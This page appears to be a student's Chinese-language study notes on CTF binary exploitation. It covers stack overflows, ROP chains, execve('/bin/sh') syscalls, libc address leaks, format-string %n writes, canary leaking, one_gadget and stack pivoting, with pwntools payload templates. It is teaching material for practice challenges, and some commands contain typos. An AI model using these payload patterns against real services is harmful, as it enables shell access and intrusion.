<h5 id="函数栈的工作方式，rope链的构造，动态链接的解析过程"><a href="#函数栈的工作方式，rope链的构造，动态链接的解析过程" class="headerlink" title="函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;"></a>函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;</h5></li>
</ul>
<p>在pwntools中shellcraft.sh</p>
<p>在文件中可以通过如下代码链接，从而对文件中的部分数据进行分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果在文件中有puts函数，可以通过如下代码查看puts函数在got表像中的地址（）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])/不加hex（）则打印出来的是十进制数字，hex将十进制转化为<span class="number">16</span>进制</span><br><span class="line">next(elf.search(b<span class="string">&quot;/bin/sh&quot;</span>))    </span><br></pre></td></tr></table></figure>



<p><strong>动态调试</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 文件名（必须是可执行的文件a.out）</span><br></pre></td></tr></table></figure>

<p>进入调试出现pwndbg&gt;标志吧</p>
<p>b+断点，然后r开始调式</p>
<p>start，程序将停在main函数的第一行，或程序的入口第一条指令。</p>
<p>backtrace显示·整个函数的函数调用栈的状况，由上到下调用，下调用上。</p>
<p>return直接回到main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> #!/bin/sh</span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> gcc -fno-<span class="built_in">stack</span>-protector -z exestack -no-pie -g -o wwww wwww.c </span><br></pre></td></tr></table></figure>

<p>gcc -fno-stack-protector关闭canary</p>
<p>canary保护</p>
<p>当栈被创立的时候会在ebp的下面放上一个随机值，在程序执行到返回时先检查那个随机值是否正确。不正会直接停止运算</p>
<p>-z exestack打开栈的可执行权限</p>
<p>-no-pie,关闭pie</p>
<p>pie 将elf文件的本体和载入地址都随机化（text，data，bss区的地址）</p>
<p>-g可以在调式时代上源代码，但要在最后加上源代码文件</p>
<p>-o输出文件的名字</p>
<p>在保存后用chmod +x 文件名，为文件赋权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>修改发送的栈的地址是不是随机值，正常情况下&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space的值为2，若要此时的栈地址则会得到的是一个随机值，修改为0后将称为一个定值，可以通过cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space知道其值为多少，</p>
<p>![屏幕截图 2023-11-21 211454](博客&#x2F;屏幕截图 2023-11-21 211454-17115441695152-17115441721904-17115441747796.png)</p>
<p>通过动态调试，可以知道我们输入的AAA在一开始入栈的地址为0x7fffffffdeb0,而ebp指向的为0x7fffffffdf20，距离是160个字节，故我们要填充的是160+8（x64系统为8个）垃圾数据然后的8个为需要执行的数据，</p>
<p>在攻击前由于程序是x64需通过一下指令在pwntools中修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br></pre></td></tr></table></figure>

<p>ldd 文件名（必须为可执行的文件名），查看该文件用到的所有动态链接库，如图</p>
<p>![屏幕截图 2023-11-21 220537](博客\屏幕截图 2023-11-21 220537.png)</p>
<p>其中要重点关注的是第二行，libc.so.6是软链接相当于快捷方式的值指向的是lib中的存放C语言的动态链接库</p>
<p>动态链接库本身就是一个可执行文件，他也有可执行的入口 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary yichu --only <span class="string">&quot;pop|ret&quot;</span>，？</span><br></pre></td></tr></table></figure>

<p>在yichu这个可执行文件中寻找为pop，ret的汇编代码</p>
<p>在文件名搜system，</p>
<p>int 0x80,中断号代表进行系统调用，调用系统函数时，函数名一般为sys_write（），但是我们不能直接用他的名称只能在调用时用代号，如sys_write()代号为4，sys_execve()代号11,0xb，可以用0xb直接调用sys_execve()</p>
<p>在使用int 0x80，要确保（eax&#x3D;0xb,ebx&#x3D;0x8048xxxx,ecx&#x3D;0,edx&#x3D;0）这4个寄存器都已经完成初始化，eax中的0xb代表的是系统函数的调用代（0xb-&gt;sys_execve()）,ebx中存放的是我们最后要执行到的最后地址，如、bin&#x2F;sh&#x2F;的地址</p>
<p>![屏幕截图 2024-01-07 155233](博客\屏幕截图 2024-01-07 155233.png)</p>
<p>payload&#x3D;b’A’*112(垃圾数据)+p64(pop_eax_ret)+p64(0xb)+p64(pop_edx_ecx_ebx_ret)+p64(0)+p64(0)+p64(bin_sh)+p64(int_80h)[其中的pop_eax_ret，pop_edx_ecx_ebx_ret，bin_sh，int_80h都要在程序中找到地址并在程序之前写明]</p>
<p>![屏幕截图 2023-11-22 213524](博客\屏幕截图 2023-11-22 213524.png)</p>
<p>![屏幕截图 2023-11-23 150419](博客\屏幕截图 2023-11-23 150419.png)</p>
<p>在linux中可以生成的可执行文件分为动态链接文件和静态链接文件，用gcc默认生成的是动态链接，用file分析会出现dynamically linke的标志，其中不含有C语言的基本执行代码只有经过编译后的源码，在执行时与系统链接使用C语言的基本代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --<span class="type">static</span> 文件名</span><br></pre></td></tr></table></figure>

<p> 当执行以上代码时会生成静态链接的文件，用file分析是会有statically linke的标志，其中包含有C              语言的基本执行代码。 </p>
<p>![屏幕截图 2023-11-23 152644](博客\屏幕截图 2023-11-23 152644.png)</p>
<p>![屏幕截图 2023-11-23 153131](博客\屏幕截图 2023-11-23 153131.png)</p>
<p>.got 保存了整个程序的虚拟内存空间中各个符号（变量）的偏移量（地址）</p>
<p>.got.plt保存的是函数的地址</p>
<p>●.dynamic section</p>
<p>○提供动态链接相关信息，为操作系统描述整个动态链接的所用内容包括其他的表的位置等等</p>
<h4 id="●link-map"><a href="#●link-map" class="headerlink" title="●link_map"></a>●link_map</h4><p>○保存进程载入的动态链接库的链表</p>
<p>●__dl_runtime_resolve</p>
<p>○装载器中用于解析动态链接库中函数的实际址的函数</p>
<p><strong>动态链接的过程![屏幕截图 2023-11-23 164625](博客\屏幕截图 2023-11-23 164625.png)</strong></p>
<p>1，第一次进行链接</p>
<p>在程序中先定义一个foo函数</p>
<p>代码段首次调用foo，跳转到 .plt 中的 foo 函数项，.plt 中的代码会使程序立即跳转到 .got.plt 中记录的地址</p>
<p>由于进程是第一次调用 foo，故 .got.plt 中记录的地址是 foo@plt+1，于是会跳转到plt中的下一段代码，先将index入栈，index包括的是foo这个函数的在我们程序的位置（第几个函数），然后是跳转到PLT0段</p>
<p>在PLT0中再将一个数入栈，这个数指的是用到的是哪一个动态链接库，之后进行跳转，到_dl_runtime_resolve函数，这个函数将解析 foo 的真正地址填入 .got.plt 中</p>
<p>此后 .got.plt 中保存的是 foo 的真实地址</p>
<p>![屏幕截图 2023-11-23 165300](博客\屏幕截图 2023-11-23 165300.png)</p>
<p>之后的调用到.got.plt处时便可以直接拿到foo的真实地址</p>
<p>栈对齐，ret的加入，call的入栈使其对齐</p>
<p><strong>ida基操</strong></p>
<p>ida中shift+F12查找字符串 </p>
<p>g可直接跳转到某个地址</p>
<p>n 可以替换字符名称</p>
<p>h 可以将数字从10进制转为16进制</p>
<p>context.arch&#x3D;”amd64”</p>
<p>print(asm(shellcraft.amd64.sh()))（</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
<p>![屏幕截图 2023-12-03 112959](博客\屏幕截图 2023-12-03 112959.png)</p>
<p>对于在动态链接中调用一个在plt段上的函数，先在ida中的plt段中找到需要调用的函数的地址，在栈溢出之后直接来到plt段的函数进行调用，需要注意的是在调用plt段中函数时由于函数会先创造一个独属于自己的栈，虽然这个栈不用关注，但由于这个栈的存在，在payload中plt函数不会直接读取下一个地址而是读取下下个地址，如get@plt会用的的是buf2的地址不会用中间的那一个。</p>
<p>如果我们在使用时，需要平衡栈空间，便需要消除栈中的数据，对于get下的一个数据get会在最后进行消除，但buf2段不会被消除，此时便需要一个pop|ret的值在中间加入进去，对buf2的值进行消除，对于pop|ret的选择，最后选择通用寄存器入ebx等对程序不会起到大作用的寄存器加进去。</p>
<p>以上的方法主要适用于在32位中的程序中，如果在64位的程序中，由于函数不会直接调用栈中的参数，在64位的系统中参数的前6个会分别存放在rdi、rsi、rdx、rcx、r8、r9 寄存器中，之后的才会放在栈中，同样的函数调用也是相同的，于是只要在函数执行前将函数调用的参数放在那6个寄存器中（一般函数调用一个参数时，更多的是将rdi的值修改为所需参数在的地址。相同的像gets这种输入的函数，先将rdi的值改为bss段中的空地址，于是输入的值便会直接将存放在那个bss段中，在后期调用时，将rdi中的值改为那个地址，然后直接将程序跳plt段中的函数地址，便会直接调用rdi中的地址的参数，执行函数。）</p>
<p>![屏幕截图 2023-12-03 152037](博客\屏幕截图 2023-12-03 152037.png)</p>
<p>![屏幕截图 2023-12-03 151541](博客\屏幕截图 2023-12-03 151541.png)![屏幕截图 2023-12-03 151922](博客\屏幕截图 2023-12-03 151922.png)</p>
<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4_i386（32位程序）的</strong></p>
<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4&#x2F;3.5_amd64（64位程序）的</strong></p>
<p>在pwntools中，p.recvuntil(“\n”)指的是接收数据，直到遇到换行符”\n”为止。这个指令用于从程序的输出中提取特定的数据。</p>
<p>libcaddr&#x3D;u64(p.recv(6).ljust(8,”\x00”))指的是从程序的输出中接收6个字节的数据，然后用空字节”\x00”填充到8个字节，并将其解释为一个64位的无符号整数（unsigned long long）。</p>
<p>而libcaddr&#x3D;u32(io.recv(4))指的是从程序的输出中接收4个字节的数据，并将其解释为一个32位的无符号整数（unsigned int）。</p>
<h3 id="如何获取函数在libc中的偏移量呢？"><a href="#如何获取函数在libc中的偏移量呢？" class="headerlink" title="如何获取函数在libc中的偏移量呢？"></a>如何获取函数在libc中的偏移量呢？</h3><p>这里可能有两种情况，一种是libc已知，一种是libc未知。</p>
<p><strong>libc已知</strong></p>
<p>libc已知的情况，可以通过反编译libc获取地址。如下所示，利用radare分析libc文件，可以获取libc中write的偏移地址是<code>0x000d43c0</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000187c0</span>]&gt; afl | grep write</span><br><span class="line"><span class="number">0x00063880</span>   <span class="number">22</span> <span class="number">406</span>  -&gt; <span class="number">395</span>  sym._IO_wdo_write</span><br><span class="line"><span class="number">0x000d43c0</span>    <span class="number">5</span> <span class="number">101</span>          sym.__write</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>也可以通过pwntools的ELF类，加载libc文件来获取目标函数的偏移地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc= ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_write_offset = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br></pre></td></tr></table></figure>



<p>在64位的系统中在执行部分函数时其汇编代码中有,当程序在执行时发现停在这条指令而无法继续执行下去时说明程序在该函数的栈存在栈没有对齐的情况，解决的方法便是在payload的该函数的执行之前加上一个ret的命令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0这条指令会检查栈是否对齐</span><br></pre></td></tr></table></figure>



<p>再说b’a’*56的作用，他的作用就是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然执行400616处的函数，我们不希望它执行到此，因为会再次pop寄存器更换我们布置好的内容，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域,可以被填充)，用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p>
<p>在C语言中对于一段字符串的存放与取用</p>
<p>存放：在地址空间中将字符串转化位用x00截断的一串连续的字节序列（\ad\ds\ew\vd\x00）</p>
<p>取用：为了节省空间在取用这一段数据时不会直接将整个数据直接传入到函数中，只会把那个数据存放的地址作为指针，把指针作为参数传入到函数中，在调用函数时函数再到指针所指的地址中将那段数据，读出来使用。</p>
<p>在使用printf打印字符时，当传进的数用的是</p>
<p>%p时直接打印的栈上存放的数据，无论是真实的数据还是地址数据都直接打印出来，不做任何的操作</p>
<p>%s时则会先把栈中的数据作为地址将其解析，然后将其作为地址对应的数据打印出来</p>
<p>%n的作用是将栈中的数据作为地址将其解析，然后向那个数据的地址写入数据，而写入的数据是<strong>格式化字符串前方已经打印成功的字符的个数</strong>（如在%n执行之前成功打印出AAAAA的数据，则会在%n所在的数据代表的地址执行的地方改写成5），</p>
<p>%11$n是一个格式化字符串中的特殊标记，它表示将当前打印字符的数量存储在第11个参数所指向的位置中。这个特性通常被用于进行格式化字符串漏洞攻击，要写第几个参数的位置就在%n中加上几$</p>
<p>%c表示输出一个字符，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c,&quot;</span>c)</span><br></pre></td></tr></table></figure>

<p>则会打印a这个字符，如果在后面有%n则算作1，如果%n要多个则可以将要的字节长度加在%和n的中间，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%20n&quot;</span>,c)</span><br></pre></td></tr></table></figure>

<p>执行这个指令会打印的是长度为20的数据，且最后是a，在之前用空格补充不足20字节的地方，而如果后面有%n这会直接输入的数为20</p>
<p>在用printf函数时,在打印数据的符号中间加上（’数字$‘）意为打印第几个参数的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c)</span><br></pre></td></tr></table></figure>

<p>如这个，意为直接打印第三个参数，c的值</p>
<p>对于在程序输出中的数据中有我们需要的地址，但不是直接输出，可以用如下接收、</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cancry =<span class="type">int</span>(io.recv(<span class="number">16</span>/<span class="number">8</span>),<span class="number">16</span>)<span class="comment">//如果是64位程序为16,32位为8</span></span><br><span class="line"><span class="comment">//16和8的区别在于程序最终需要的数据是几位的（16进制），如要的是0x0x5619d9400ccd，这为io.recv（12）    </span></span><br><span class="line">    libc_start_main = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=u64(io.recv(<span class="number">12</span>))</span><br><span class="line">    libc_start_main = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=<span class="type">int</span>(io.recvline().strip().split(b<span class="number">&#x27;</span> <span class="string">&#x27;)[-1])</span></span><br></pre></td></tr></table></figure>





<p>所以我们需要把system的地址分成高八位和低八位 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">high_sys = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">low_sys = system_addr &amp; <span class="number">0xffff</span></span><br></pre></td></tr></table></figure>

<p>这里的右移16位就是向右移动4个字节，获得到high_sys的高4位地址</p>
<p>这个错误是由于在将整数转换为字节串时，需要使用<code>encode()</code>函数。你可以使用以下代码来解决这个问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack-<span class="number">0xc</span>) &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%6&amp;hhn&#x27;</span></span><br></pre></td></tr></table></figure>



<p>在有些题中会遇到如下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br></pre></td></tr></table></figure>

<p>解释一下，这里将当前的时间作为一个种子复制给v0（*v0 &#x3D; time(0LL)*），将v0这个种子植入到srand函数中，之后rand函数会根据srand中的数值生成一个随机数，由于之前的种子是有当时时间决定的，故理论上每次运行中的rand中的值由于v0的不同而生成的随机数也不同。如果不将srand中的值用v0作为一个时间变量的话rand中生成的随机数是固定的一个数。</p>
<p>如果在程序中不能直接暴露那个随机数可通过以下代码直接将那个数在脚本中同样生成，（同时运行时间相同，srand生成相同的随机数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>) #调用标准库</span><br><span class="line">srand = libc.srand(libc.time(None)) <span class="meta">#libc.time(None) 获取当前时间，然后将这个时间值传递给 libc.srand 函数来设置随机数生成器的种子</span></span><br><span class="line">saved_cookie = libc.rand() #生成随机数</span><br><span class="line">io.sendline(str(saved_cookie))#数字传入程序中需要str    </span><br></pre></td></tr></table></figure>

<p>libc.so.6是调用本地的库，在打远程时需根据远程的环境改变，</p>
<p>这一段代码要放在接近程序中生成随机数的地方，最好脚本的开始。</p>
<p>fgets函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> bufsize, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>其中的int bufsize指的是能输入的字节的大小，将int bufsize看作n，fgets函数只能读取 n-1 个字符（包括换行符）。如果有一行超过 n-1 个字符，那么 fgets 函数将返回一个不完整的行（只读取该行的前 n-1 个字符）</p>
<p>也就是说，每次调用时，fgets 函数都会把缓冲区的最后一个字符设为 null(‘\0’)，这意味着最后一个字符不能用来存放需要的数据。所以如果某一行含有 size 个字符（包括换行符），要想把这行读入缓冲区，要把参数 n 设为 size+1，即多留一个位置存储 null(‘\0’)。</p>
<h6 id><a href="#" class="headerlink" title></a></h6><p>在payload的构造中如果要使用到base64编码一个数据，在传入到中可以用以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64//导入库，在脚本的一开始处就要</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">22</span>//在使用base64这个库时因为后面的代码有地方改变，不能加b</span><br><span class="line">payload64= base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">//将payload中的值转化为base64编码的赋值给paylaod64</span><br><span class="line">//此时直接输出payload64中的值会自动加入b，可直接使用</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">32</span>+p32(printf)</span><br><span class="line">payload64= base64.b64encode(payload)</span><br></pre></td></tr></table></figure>



<p>在使用栈覆盖将canary暴露出来是，先在调试阶段找到canary的地方，确定输入多少才能到canary的地方，如输入地方在0x11处，在调试中的canary指到的地方位0x22，距离为17个数，这可以构建的payload为b‘A’*17+b’B’，B的作用在与覆盖00，根据canary的值确定收的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;A&quot;</span>*(<span class="number">17</span>)+<span class="string">&#x27;B&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">canary=u32(b<span class="string">&quot;\x00&quot;</span>+io.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>



<p>沙箱查询，用一下命令查找程序是否启动了沙箱</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>

<p><img src="https://p1.ssl.qhimg.com/t0158ada8c0a923003f.png" alt="img"></p>
<p>如果出现了以上情况则说明该程序中的禁用了 <code>execve</code>, 由于<code>system</code>函数实际上也是借由 <code>execve</code>实现的, 因此通过 <code>get shell</code>的方法来解决本题比较困难 ，要用到ORW方法</p>
<p>如果程序没用使用沙箱则会出现程序正常的执行效果。</p>
<p>对于直接可以获得getshell的题，并且题目中没有后门函数，直接获得getshll的方法有3种</p>
<p>1.用got表中的system和&#x2F;bin&#x2F;sh的地址直接获得getshell</p>
<p>2.使用one_gadget直接获得shell</p>
<p>3.修改寄存器的值并执行命令</p>
<p>对于以上3种办法，第一种不多说，直接整就行，重点在第2，3种</p>
<p>二，ong_gadget其实是在库中的一段指令，而这段指令只要执行就可以直接获得shell，但这种指令对寄存器有一定的要求，所以不并不是都可以，并且有的版本过高使得不能一次直接执行成功，我们一般也不会只得到一个，最好一个一个试看看能获得shell，</p>
<p>对于程序中的one_gadget的寻找可以通过一个工具直接找，需要执行以下的名令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>(/usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span>)</span><br></pre></td></tr></table></figure>

<p>后面接入的是动态链接库，对于32位和64位是不同的库，可以直接在gdb在找，如要打远程则用远程的库，</p>
<p>![屏幕截图 2024-01-07 150423](博客\屏幕截图 2024-01-07 150423.png)</p>
<p>一般执行后的情况如下</p>
<p>![屏幕截图 2024-01-07 150608](博客\屏幕截图 2024-01-07 150608.png)</p>
<p>要用到的是execve前面的数，这个数字代表这的是在程序中的one_gadget相对于程序基值的偏移量，在使用的过程中用这个数加上程序的基值，便是one_getgad的地址，将程序在执行过程中挟持到这个地方便可以执行one_getgad.但是很多时候并不能成功要每一个都试一下</p>
<p>三，对于第3种修盖寄存器的指令，就是如下的办法，但很多时候程序中有的指令时不够用的，以此便要提到使用库中的方法</p>
<p>![屏幕截图 2024-01-07 155233](博客\屏幕截图 2024-01-07 155233.png)</p>
<p>在所有的动态链接库中都有很多的指令，不过动态链接库中的地址都是相对偏移量，要加上程序的基值才是真实地址，并且有的并不能把直接用，要多试</p>
<p>![屏幕截图 2024-01-07 154649](博客\屏幕截图 2024-01-07 154649.png)</p>
<p>如图，可以使用ROP的方法在链接库中寻找需要的偏移量，相同的对于在函数中要用的syscall和0x80指令都可以在动态链接库中找到，然后直接用就行，</p>
<p>对于64位的程序补充一种指令的使用，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi--&gt;binsh</span><br><span class="line">rsi--&gt;<span class="number">0</span></span><br><span class="line">r15--&gt;<span class="number">0</span></span><br><span class="line">rdx--&gt;<span class="number">0</span></span><br><span class="line">system    </span><br></pre></td></tr></table></figure>

<p>对于64位的程序如果直接用system(&#x2F;bin&#x2F;sh)可能会出现问题，便可以用以上的方法获得shell</p>
<p>栈迁移</p>
<p>对与在栈溢出的情况中如果，输入的地方有限制使得能溢出的大小比较小，不够直接直接执行getgad便需要将栈进行迁移，对于迁移的地方有两个，一种是将程序在此迁移到栈执行的地方将程序在栈上在执行一次，将我们的getgad输入到栈上，执行之后获得shell，但这种的限制比较高，最好不要将程序只要，最好将程序通过溢出使其栈迁移到bss段中的空白处，然后向那段程序中写入getgad并执行</p>
<p>无论是32位还是64位的程序，基础的栈迁移都是一样的，先将要溢出的0-地方的写满，刚好写到变量的最大值（看程序中的变量到ebp的距离），先全部覆盖完之后，在写入要将栈迁移的地址，最后写leave的地址（在程序中找，一般可以直接找到）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到ebp的量)+p32(新地址)/p64()+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>

<p>这样之后栈的ebp便会改变为新的地址，然后程序便会执行新地址4位（32位的程序）&#x2F;8位数（64位的程序）后面的地址中的指令，而新地址的前面4或8位数将成为程序执行这一部分时的ebp中的值，因此，<strong>在bss段中栈的新迁移地址的前4&#x2F;8位数要么是垃圾数据，要么是再下次栈迁移的新地址。</strong></p>
<p>如果在程序中有canary保护时，栈迁移则需要先将canary绕过在将数据覆盖到ebp的位置，然后再迁移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*程序崩溃前最大值+p32/<span class="number">64</span>(canary)<span class="comment">//如果有问题将p32/p64去除，直接使用canary</span></span><br><span class="line">payload=payload.ljust(到ebp的量,b<span class="number">&#x27;</span>\<span class="number">00&#x27;</span>)</span><br><span class="line">payload+=p32/<span class="number">64</span>(新地址)+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>



<p>在很多可以输入的地方，特别要注意是否对输入的数据的长度有没有检查，对于有检查的要重点注意输入的数据是否超出可以输入的长度，特别在栈迁移中，对于是否要加上<strong>line</strong>，既在输入的数据的末位加上<strong>\n</strong>(很多时候这个换行符会被当成一个字节)要多加小心，有时会因为这个字节使输入时出现问题</p>
<p>同时<strong>line</strong>的使用也是必不可少的，有时候不加这个最后的换行符，会使数据传不过去，要随时注意</p>
<p><strong>在有的栈迁移中垃圾数据的长度不一定是到rdp长度加上8&#x2F;4，有可能只是到rbp的长度不用加上后面的数据便可以直接进行栈迁移</strong></p>
<p>再用动态链接库调用函数的偏移地址的方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span>=elf.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line">sys=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = next(elf.search(bytes(<span 